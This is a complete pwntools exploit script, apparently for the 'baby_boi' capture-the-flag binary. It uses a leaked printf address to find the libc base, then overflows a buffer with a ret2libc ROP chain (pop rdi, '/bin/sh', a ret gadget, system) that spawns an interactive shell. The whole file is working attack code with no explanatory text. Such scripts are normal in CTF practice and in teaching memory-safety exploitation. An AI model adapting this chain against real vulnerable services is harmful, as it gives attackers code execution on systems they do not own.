#!/usr/bin/python3
from pwn import *

context.log_level = 'debug'
exe = context.binary = ELF("/tmp/patch/baby_boi_patched", checksec=False)
libc = ELF("/tmp/patch/libc-2.27.so", checksec=False)

p = process()
#p = remote()

#gdb.attach(p, gdbscript='''
#
#''')

p.recvuntil(b"Here I am: ")
libc_leak = int(p.recvline(), 16)
libc.address = libc_leak - libc.sym['printf'] 
log.info("Libc leak: " + hex(libc_leak))
log.info("Libc base: " + hex(libc.address))

pop_rdi = 0x0000000000400793

input()
payload = b'A'*40
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh"))) 
payload += p64(0x000000000040054e)
payload += p64(libc.sym['system'])

p.sendline(payload)
p.interactive()
